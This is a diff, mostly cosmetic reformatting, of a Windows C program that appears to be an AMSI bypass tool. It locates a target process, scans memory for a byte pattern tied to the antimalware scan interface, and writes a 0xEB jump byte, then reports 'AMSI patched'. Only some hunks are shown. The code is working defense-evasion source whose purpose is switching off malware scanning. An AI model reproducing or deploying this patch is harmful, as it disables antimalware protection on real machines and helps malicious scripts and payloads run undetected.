@@ -12,7 +12,9 @@
 
 char patch[] = { 0xEB };
 
-DWORD GetPID(LPCSTR pn)
+DWORD
+GetPID(
+	LPCSTR pn)
 {
 	DWORD procId = 0;
 	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
@@ -37,31 +39,38 @@ DWORD GetPID(LPCSTR pn)
 		}
 	}
 	CloseHandle(hSnap);
-	return procId;
+	return (procId);
 }
 
-unsigned long long int searchPattern(BYTE* startAddress, DWORD searchSize, BYTE* pattern, DWORD patternSize, unsigned long long int AmsiAddr) {
+unsigned long long int
+searchPattern(
+	BYTE* startAddress, 
+	DWORD searchSize, 
+	BYTE* pattern, 
+	DWORD patternSize, 
+	unsigned long long int AmsiAddr)
+{
 	DWORD i = 0;
+
 	while (i < 1024) {
+
 		if (startAddress[i] == pattern[0]) {
-			// Check if the next bytes match the pattern
 			DWORD j =1;
 			while (j < patternSize && i + j < searchSize && (pattern[j] == '?' || startAddress[i + j] == pattern[j])) {
 				j++;
 			}
-
 			if (j == patternSize) {
 				printf("offset : %d\n ", i + 3);
 				return (i + 3);
 			}
 		}
-
 		i++;
 	}
 }
 
 
-int wmain() {
+int
+wmain() {
 	
 	BYTE pattern[] = { 0x48,'?','?', 0x74,'?',0x48,'?' ,'?' ,0x74,'?' ,0x48,'?' ,'?' ,'?' ,'?',0x74,0x33};
 
@@ -104,5 +113,6 @@ int wmain() {
 	printf("\nAMSI patched\n");
 
 	system("pause");
+
 	return 0;
 }
